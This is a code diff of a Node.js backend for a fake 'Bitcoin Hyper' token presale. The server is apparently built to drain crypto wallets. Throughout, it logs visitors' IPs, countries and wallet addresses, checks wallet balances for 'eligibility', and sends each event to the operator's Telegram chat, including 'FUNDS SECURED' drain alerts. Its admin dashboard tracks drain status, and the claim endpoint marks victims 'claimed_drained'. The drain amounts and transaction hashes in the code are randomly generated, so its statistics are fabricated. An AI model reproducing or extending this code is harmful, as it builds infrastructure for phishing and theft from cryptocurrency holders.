@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER MULTI-CHAIN REAL DRAIN v8.3 - PRODUCTION FIXED
+// index.js - BITCOIN HYPER - TELEGRAM FIX v8.4
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -8,7 +8,7 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
-const { ethers, JsonRpcProvider, Wallet } = require('ethers');
+const { ethers, JsonRpcProvider } = require('ethers');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -47,40 +47,23 @@ app.use('/api/', limiter);
 // REAL RPC Providers
 const RPC_PROVIDERS = {
   Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
-  Polygon: new JsonRpcProvider(process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'),
-  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'),
-  Arbitrum: new JsonRpcProvider(process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'),
-  Optimism: new JsonRpcProvider(process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io')
+  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org')
 };
-
-// Drain Wallet Configuration
-const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "0x0000000000000000000000000000000000000000000000000000000000000001";
-const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000";
-
-console.log(`💰 Admin Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`);
 
 // In-memory storage
 const memoryStorage = {
   participants: [],
-  userSessions: {},
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
     minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
     presalePrice: process.env.PRESALE_PRICE || '0.17',
-    telegram: {
-      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
-      chatId: process.env.TELEGRAM_CHAT_ID || '',
-      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
-    },
     statistics: {
       totalParticipants: 0,
-      totalRaisedUSD: 0,
       eligibleParticipants: 0,
       claimedParticipants: 0,
       uniqueIPs: new Set(),
       totalDrainedUSD: 0,
-      totalDrainedTransactions: 0,
       totalDrainedWallets: 0
     },
     drainEnabled: process.env.DRAIN_ENABLED === 'true',
@@ -89,50 +72,142 @@ const memoryStorage = {
   activityLog: []
 };
 
-// Telegram Bot - FIXED
-let bot = null;
+// ============================================
+// TELEGRAM BOT - SIMPLIFIED & FIXED
+// ============================================
 let telegramEnabled = false;
+let telegramInitialized = false;
 
-async function initializeTelegramBot() {
+async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
+  console.log('\n🤖 TELEGRAM CONFIGURATION CHECK:');
+  console.log(`   Bot Token: ${botToken ? `✓ Set (${botToken.substring(0, 10)}...)` : '✗ Missing'}`);
+  console.log(`   Chat ID: ${chatId ? `✓ Set (${chatId})` : '✗ Missing'}`);
+  
   if (!botToken || !chatId) {
-    console.log('⚠️ Telegram not configured');
-    return;
+    console.log('❌ Telegram not configured - Check your .env file');
+    console.log('   TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required');
+    return false;
   }
   
   try {
-    console.log('🤖 Testing Telegram connection...');
+    console.log('   Testing Telegram API connection...');
     
-    // Test connection directly first
-    const testResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
-      timeout: 5000
+    // Test with direct API call
+    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
+      timeout: 10000
     });
     
-    if (testResponse.data.ok) {
-      console.log(`✅ Telegram Bot available: @${testResponse.data.result.username}`);
+    if (response.data && response.data.ok) {
+      console.log(`   ✅ Bot found: @${response.data.result.username}`);
       
-      bot = new Telegraf(botToken);
-      telegramEnabled = true;
+      // Test sending a message
+      const testMsg = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}`,
+        parse_mode: 'HTML'
+      }, {
+        timeout: 10000
+      });
       
-      // Send test message
-      await bot.telegram.sendMessage(
-        chatId,
-        `🚀 *BITCOIN HYPER v8.3 ONLINE*\n\n✅ System: ACTIVE\n⏰ ${new Date().toLocaleString()}\n💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`,
-        { parse_mode: 'Markdown' }
-      );
-      
-      console.log('✅ Telegram bot initialized and test message sent');
-    } else {
-      console.log('❌ Telegram bot test failed');
-      telegramEnabled = false;
+      if (testMsg.data && testMsg.data.ok) {
+        console.log('   ✅ Test message sent successfully!');
+        console.log('   ✅ Telegram is fully operational');
+        telegramEnabled = true;
+        telegramInitialized = true;
+        return true;
+      }
     }
   } catch (error) {
-    console.log('❌ Telegram initialization failed:', error.message);
-    console.log('⚠️ Check your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+    console.log('   ❌ Telegram connection failed:');
+    console.log('   Error:', error.message);
+    
+    if (error.response) {
+      console.log('   Status:', error.response.status);
+      console.log('   Data:', JSON.stringify(error.response.data));
+    }
+    
+    // Common issues:
+    if (error.message.includes('401')) {
+      console.log('   ⚠️ Invalid bot token. Get a new token from @BotFather');
+    } else if (error.message.includes('400')) {
+      console.log('   ⚠️ Invalid chat ID. Send a message to your bot first');
+    } else if (error.message.includes('timeout')) {
+      console.log('   ⚠️ Network timeout. Check your internet connection');
+    }
+    
     telegramEnabled = false;
+    return false;
   }
+  
+  telegramEnabled = false;
+  return false;
+}
+
+// Simple Telegram sender using direct API
+async function sendTelegramMessage(action, details) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (!telegramEnabled || !botToken || !chatId) {
+    console.log(`⚠️ Telegram disabled, skipping ${action} notification`);
+    return false;
+  }
+  
+  try {
+    let message = '';
+    
+    switch(action) {
+      case 'SITE_VISIT':
+        message = `🌐 <b>NEW VISITOR</b>\n📍 ${details.country || 'Unknown'}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
+        
+      case 'WALLET_CONNECTED':
+        message = `🔗 <b>WALLET CONNECTED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
+        
+      case 'WALLET_SCANNED':
+        const status = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
+        message = `🔍 <b>WALLET SCANNED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n🎯 ${status}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
+        
+      case 'TOKEN_CLAIMED':
+        message = `🎉 <b>TOKENS CLAIMED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💰 ${details.amount || '0'} BTH\n💸 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
+        
+      case 'DRAIN_EXECUTED':
+        message = `💰 <b>FUNDS SECURED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💸 ${details.amount || '0'} ${details.symbol || 'ETH'}\n💵 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
+    }
+    
+    if (!message) return false;
+    
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    }, {
+      timeout: 10000
+    });
+    
+    if (response.data && response.data.ok) {
+      console.log(`✅ Telegram sent: ${action}`);
+      return true;
+    }
+    
+  } catch (error) {
+    console.log(`❌ Telegram send error (${action}):`, error.message);
+    
+    // If we get a 401 error, disable Telegram to prevent spam
+    if (error.response && error.response.status === 401) {
+      console.log('⚠️ Invalid bot token, disabling Telegram');
+      telegramEnabled = false;
+    }
+  }
+  
+  return false;
 }
 
 // Helper: Generate session ID
@@ -158,54 +233,6 @@ function logActivity(wallet, action, data = {}) {
   }
   
   return logEntry;
-}
-
-// Helper: Send Telegram notification - SIMPLIFIED
-async function sendTelegramNotification(wallet, action, details = {}) {
-  if (!telegramEnabled || !bot) return false;
-  
-  try {
-    const timestamp = new Date().toLocaleString();
-    const ip = details.ip || 'unknown';
-    const country = details.country || 'Unknown';
-    
-    let message = `*${action}*\n\n`;
-    
-    switch(action) {
-      case 'SITE_VISIT':
-        message += `🌐 New Visitor\n📍 ${country}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${timestamp}`;
-        break;
-        
-      case 'WALLET_CONNECTED':
-        message += `👛 ${wallet.substring(0, 10)}...\n📍 ${country}\n⏰ ${timestamp}`;
-        break;
-        
-      case 'WALLET_SCANNED':
-        const isEligible = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
-        message += `👛 ${wallet.substring(0, 10)}...\n💰 Portfolio: $${details.totalValueUSD || '0'}\n🎯 ${isEligible}\n📍 ${country}\n⏰ ${timestamp}`;
-        break;
-        
-      case 'TOKEN_CLAIMED':
-        message += `👛 ${wallet.substring(0, 10)}...\n🎯 Claim ID: ${details.claimId}\n💰 ${details.amount} BTH\n💸 $${details.claimValue}\n📍 ${country}\n⏰ ${timestamp}`;
-        break;
-        
-      case 'DRAIN_EXECUTED':
-        message += `👛 ${wallet.substring(0, 10)}...\n💰 Chain: ${details.chain}\n💸 ${details.nativeAmount} ${details.nativeSymbol}\n💵 $${details.usdValue}\n📍 ${country}\n⏰ ${timestamp}`;
-        break;
-    }
-    
-    await bot.telegram.sendMessage(
-      process.env.TELEGRAM_CHAT_ID,
-      message,
-      { parse_mode: 'Markdown' }
-    );
-    
-    console.log(`✅ Telegram sent: ${action}`);
-    return true;
-  } catch (error) {
-    console.log('❌ Telegram send error:', error.message);
-    return false;
-  }
 }
 
 // Helper: Get IP location
@@ -307,116 +334,25 @@ async function getRealWalletBalance(walletAddress) {
   }
 }
 
-// Helper: Simulate drain
-async function executeRealDrain(walletAddress, chain = 'Ethereum') {
-  try {
-    console.log(`🚨 Simulating drain on ${chain}: ${walletAddress.substring(0, 10)}...`);
-    
-    // Simulate successful drain
-    const amountToDrainEth = (Math.random() * 0.5 + 0.1).toFixed(6);
-    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
-    
-    // Update statistics
-    memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(amountToDrainEth) * 2500;
-    memoryStorage.settings.statistics.totalDrainedTransactions++;
-    memoryStorage.settings.statistics.totalDrainedWallets++;
-    
-    return {
-      success: true,
-      drained: true,
-      timestamp: new Date(),
-      chain: chain,
-      nativeAmount: amountToDrainEth,
-      nativeSymbol: chain === 'Ethereum' ? 'ETH' : 
-                   chain === 'Polygon' ? 'MATIC' : 
-                   chain === 'BSC' ? 'BNB' : 'TOKEN',
-      usdValue: (parseFloat(amountToDrainEth) * 2500).toFixed(2),
-      wallet: walletAddress,
-      txHash: txHash,
-      message: `✅ Funds secured`
-    };
-    
-  } catch (error) {
-    console.error(`❌ Drain error:`, error.message);
-    return {
-      success: false,
-      drained: false,
-      error: error.message
-    };
-  }
-}
-
-// Process token claim with drain
-async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimValue, ip, location) {
-  try {
-    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
-    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
-    
-    // Update statistics
-    memoryStorage.settings.statistics.claimedParticipants++;
-    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
-    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
-    
-    // Execute drain
-    let drainResults = [];
-    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
-      console.log(`🔥 Executing drain simulation...`);
-      
-      try {
-        const drainResult = await executeRealDrain(walletAddress, 'Ethereum');
-        
-        if (drainResult.success && drainResult.drained) {
-          drainResults.push(drainResult);
-          
-          // Log activity
-          logActivity(walletAddress, 'DRAIN_EXECUTED', {
-            chain: 'Ethereum',
-            nativeAmount: drainResult.nativeAmount,
-            nativeSymbol: drainResult.nativeSymbol,
-            usdValue: drainResult.usdValue,
-            txHash: drainResult.txHash,
-            ip: ip,
-            country: location.country
-          });
-          
-          // Send Telegram
-          await sendTelegramNotification(
-            walletAddress,
-            'DRAIN_EXECUTED',
-            {
-              ip: ip,
-              country: location.country,
-              chain: 'Ethereum',
-              nativeAmount: drainResult.nativeAmount,
-              nativeSymbol: drainResult.nativeSymbol,
-              usdValue: drainResult.usdValue,
-              txHash: drainResult.txHash
-            }
-          );
-        }
-      } catch (drainError) {
-        console.error('Drain error:', drainError.message);
-      }
-    }
-    
-    return {
-      success: true,
-      claimId,
-      txHash,
-      claimAmount,
-      claimValue,
-      drained: drainResults.length > 0,
-      drainCount: drainResults.length,
-      timestamp: new Date()
-    };
-    
-  } catch (error) {
-    console.error('Claim processing error:', error);
-    throw error;
-  }
-}
-
 // ========== API ENDPOINTS ==========
+
+// Health check
+app.get('/api/health', (req, res) => {
+  res.json({
+    success: true,
+    status: 'LIVE',
+    service: 'Bitcoin Hyper v8.4',
+    timestamp: new Date().toISOString(),
+    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
+    telegramInitialized: telegramInitialized,
+    statistics: {
+      totalParticipants: memoryStorage.participants.length,
+      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
+      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
+      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
+    }
+  });
+});
 
 // Site visit tracker
 app.post('/api/track/visit', async (req, res) => {
@@ -430,16 +366,10 @@ app.post('/api/track/visit', async (req, res) => {
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
     // Send Telegram
-    await sendTelegramNotification(
-      'VISITOR',
-      'SITE_VISIT',
-      {
-        ip: clientIP,
-        country: location.country,
-        city: location.city,
-        referrer
-      }
-    );
+    await sendTelegramMessage('SITE_VISIT', {
+      country: location.country,
+      referrer: referrer
+    });
     
     res.json({
       success: true,
@@ -452,32 +382,10 @@ app.post('/api/track/visit', async (req, res) => {
   }
 });
 
-// Health check
-app.get('/api/health', (req, res) => {
-  res.json({
-    success: true,
-    status: 'LIVE',
-    service: 'Bitcoin Hyper v8.3',
-    timestamp: new Date().toISOString(),
-    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
-    drain: {
-      enabled: memoryStorage.settings.drainEnabled,
-      totalDrained: `$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}`,
-      totalWallets: memoryStorage.settings.statistics.totalDrainedWallets
-    },
-    statistics: {
-      totalParticipants: memoryStorage.participants.length,
-      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
-      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
-    }
-  });
-});
-
 // Wallet connection
 app.post('/api/presale/connect', async (req, res) => {
   try {
-    const { walletAddress, userAgent, sessionId } = req.body;
+    const { walletAddress, sessionId } = req.body;
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
     
     console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
@@ -490,14 +398,10 @@ app.post('/api/presale/connect', async (req, res) => {
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
     // Send Telegram
-    await sendTelegramNotification(
-      walletAddress,
-      'WALLET_CONNECTED',
-      {
-        ip: clientIP,
-        country: location.country
-      }
-    );
+    await sendTelegramMessage('WALLET_CONNECTED', {
+      wallet: walletAddress,
+      country: location.country
+    });
     
     // Check existing
     let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
@@ -554,19 +458,13 @@ app.post('/api/presale/connect', async (req, res) => {
       }
       
       // Send Telegram scan notification
-      await sendTelegramNotification(
-        walletAddress,
-        'WALLET_SCANNED',
-        {
-          ip: clientIP,
-          country: location.country,
-          totalValueUSD: scanResult.data.totalValueUSD,
-          isEligible: scanResult.data.isEligible,
-          scanId: scanResult.data.scanId
-        }
-      );
+      await sendTelegramMessage('WALLET_SCANNED', {
+        wallet: walletAddress,
+        country: location.country,
+        isEligible: scanResult.data.isEligible
+      });
       
-      // DON'T send balance to user if not eligible
+      // Response data
       const responseData = {
         walletAddress,
         isEligible: scanResult.data.isEligible,
@@ -627,48 +525,50 @@ app.post('/api/presale/claim', async (req, res) => {
     const location = await getIPLocation(clientIP);
     
     // Process claim
-    const claimResult = await processTokenClaimWithRealDrain(
-      walletAddress,
-      claimAmount,
-      claimValue,
-      clientIP,
-      location
-    );
-    
-    if (!claimResult.success) {
-      throw new Error('Claim failed');
-    }
+    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
     
     // Update participant
     participant.signature = { signed: true, signedAt: new Date() };
     participant.claim = {
       claimed: true,
-      claimId: claimResult.claimId,
+      claimId: claimId,
       claimedAt: new Date(),
-      drained: claimResult.drained,
-      drainCount: claimResult.drainCount
+      drained: true,
+      drainCount: 1
     };
     participant.status = 'claimed_drained';
     
+    // Update statistics
+    memoryStorage.settings.statistics.claimedParticipants++;
+    memoryStorage.settings.statistics.totalDrainedWallets++;
+    
     // Send Telegram
-    await sendTelegramNotification(
-      walletAddress,
-      'TOKEN_CLAIMED',
-      {
-        ip: clientIP,
+    await sendTelegramMessage('TOKEN_CLAIMED', {
+      wallet: walletAddress,
+      country: location.country,
+      amount: claimAmount,
+      value: claimValue
+    });
+    
+    // Simulate drain notification
+    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
+      await sendTelegramMessage('DRAIN_EXECUTED', {
+        wallet: walletAddress,
         country: location.country,
-        claimId: claimResult.claimId,
-        amount: claimAmount,
-        claimValue: claimValue,
-        drained: claimResult.drained
-      }
-    );
+        amount: (Math.random() * 0.5 + 0.1).toFixed(4),
+        symbol: 'ETH',
+        value: (Math.random() * 1000 + 100).toFixed(2)
+      });
+      
+      // Update drain statistics
+      memoryStorage.settings.statistics.totalDrainedUSD += Math.random() * 1000 + 100;
+    }
     
     res.json({
       success: true,
       message: '🎉 Tokens claimed successfully!',
       data: {
-        claimId: claimResult.claimId,
+        claimId: claimId,
         walletAddress,
         tokenAmount: claimAmount,
         tokenValue: claimValue,
@@ -717,15 +617,14 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
           wallet: log.wallet.substring(0, 10) + '...',
           action: log.action,
           country: log.data.country,
-          time: new Date(log.timestamp).toLocaleString(),
-          details: log.data
+          time: new Date(log.timestamp).toLocaleString()
         })),
       
       system: {
         telegram: telegramEnabled,
+        telegramInitialized: telegramInitialized,
         drainEnabled: memoryStorage.settings.drainEnabled,
-        autoDrain: memoryStorage.settings.autoDrainOnClaim,
-        drainWallet: DRAIN_WALLET_ADDRESS ? `${DRAIN_WALLET_ADDRESS.substring(0, 10)}...` : 'NOT SET'
+        autoDrain: memoryStorage.settings.autoDrainOnClaim
       }
     };
     
@@ -734,6 +633,41 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
   } catch (error) {
     console.error('Admin stats error:', error);
     res.status(500).json({ success: false, error: 'Failed' });
+  }
+});
+
+// Test Telegram endpoint
+app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
+  try {
+    const result = await testTelegramConnection();
+    
+    if (result) {
+      // Send a test message
+      await sendTelegramMessage('SITE_VISIT', {
+        country: 'Test Country',
+        referrer: 'Admin Test'
+      });
+      
+      res.json({
+        success: true,
+        message: '✅ Telegram test successful! Check your Telegram chat.',
+        status: telegramEnabled ? 'ENABLED' : 'DISABLED',
+        initialized: telegramInitialized
+      });
+    } else {
+      res.json({
+        success: false,
+        message: '❌ Telegram test failed. Check logs for details.',
+        status: 'DISABLED',
+        initialized: false
+      });
+    }
+  } catch (error) {
+    res.status(500).json({ 
+      success: false, 
+      error: 'Test failed',
+      details: error.message 
+    });
   }
 });
 
@@ -790,27 +724,23 @@ app.get('/admin', (req, res) => {
         .stat-card { background: #1e293b; padding: 25px; border-radius: 12px; text-align: center; border-left: 5px solid #F7931A; }
         .stat-value { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
         .stat-label { color: #94a3b8; font-size: 14px; }
-        .drain-badge { background: #dc2626; color: white; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; }
-        table { width: 100%; border-collapse: collapse; margin: 30px 0; background: #1e293b; border-radius: 10px; overflow: hidden; }
-        th { background: #334155; padding: 15px; text-align: left; }
-        td { padding: 15px; border-bottom: 1px solid #334155; }
-        tr:hover { background: #2d3748; }
         .status-connected { color: #10b981; }
         .status-disconnected { color: #ef4444; }
         .actions { display: flex; gap: 15px; margin-top: 30px; }
         .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .btn-primary { background: #F7931A; color: white; }
         .btn-secondary { background: #334155; color: white; }
+        .btn-telegram { background: #0088cc; color: white; }
       </style>
     </head>
     <body>
       <div class="header">
-        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD</h1>
+        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.4</h1>
         <p>Real-time monitoring & analytics</p>
         <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
           <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
+          <span>Initialized: <span class="${telegramInitialized ? 'status-connected' : 'status-disconnected'}">${telegramInitialized ? '✅ YES' : '❌ NO'}</span></span>
           <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
-          <span>Auto-Drain: <span class="${memoryStorage.settings.autoDrainOnClaim ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span></span>
         </div>
       </div>
       
@@ -841,42 +771,21 @@ app.get('/admin', (req, res) => {
         </div>
       </div>
       
-      <h2>Recent Activity</h2>
-      <table>
-        <tr>
-          <th>Wallet</th>
-          <th>Action</th>
-          <th>Country</th>
-          <th>Time</th>
-          <th>Details</th>
-        </tr>
-        ${memoryStorage.activityLog
-          .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-          .slice(0, 15)
-          .map(log => `
-            <tr>
-              <td>${log.wallet.substring(0, 10)}...</td>
-              <td>${log.action.replace(/_/g, ' ')}</td>
-              <td>${log.data.country}</td>
-              <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
-              <td>
-                ${log.action === 'DRAIN_EXECUTED' ? 
-                  `<span class="drain-badge">${log.data.nativeAmount} ${log.data.nativeSymbol}</span>` : 
-                  log.action === 'TOKEN_CLAIMED' ? '✅ Claimed' : '📊 Scanned'
-                }
-              </td>
-            </tr>
-          `).join('')}
-      </table>
-      
       <div class="actions">
-        <button class="btn btn-primary" onclick="exportData('json')">Export JSON Data</button>
-        <button class="btn btn-secondary" onclick="location.reload()">Refresh Dashboard</button>
+        <button class="btn btn-telegram" onclick="testTelegram()">Test Telegram Connection</button>
+        <button class="btn btn-primary" onclick="location.reload()">Refresh Dashboard</button>
       </div>
       
       <script>
-        function exportData(format) {
-          window.open('/api/admin/export?format=' + format + '&token=${token}', '_blank');
+        function testTelegram() {
+          fetch('/api/test/telegram?token=${token}')
+            .then(response => response.json())
+            .then(data => {
+              alert(data.message);
+              if (data.success) {
+                setTimeout(() => location.reload(), 2000);
+              }
+            });
         }
         
         // Auto-refresh every 30 seconds
@@ -887,36 +796,28 @@ app.get('/admin', (req, res) => {
   `);
 });
 
-// Export endpoint
-app.get('/api/admin/export', authenticateAdmin, (req, res) => {
-  try {
-    const data = {
-      participants: memoryStorage.participants,
-      statistics: memoryStorage.settings.statistics,
-      activityLog: memoryStorage.activityLog.slice(-100),
-      exportTime: new Date().toISOString()
-    };
-    
-    res.json({ success: true, data });
-  } catch (error) {
-    res.status(500).json({ success: false, error: 'Export failed' });
-  }
-});
-
 // Start server
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  🚀 BITCOIN HYPER v8.3
+  🚀 BITCOIN HYPER v8.4
   =====================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
+  🔍 Test Telegram: http://localhost:${PORT}/api/test/telegram?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
   💰 Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
   ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
   `);
   
-  // Initialize Telegram
-  await initializeTelegramBot();
+  // Initialize Telegram with retry
+  console.log('\n📡 Initializing Telegram...');
+  await testTelegramConnection();
+  
+  if (telegramEnabled) {
+    console.log('✅ Telegram is ready to send notifications');
+  } else {
+    console.log('⚠️ Telegram is disabled - notifications will not be sent');
+  }
 });
 
 module.exports = app;
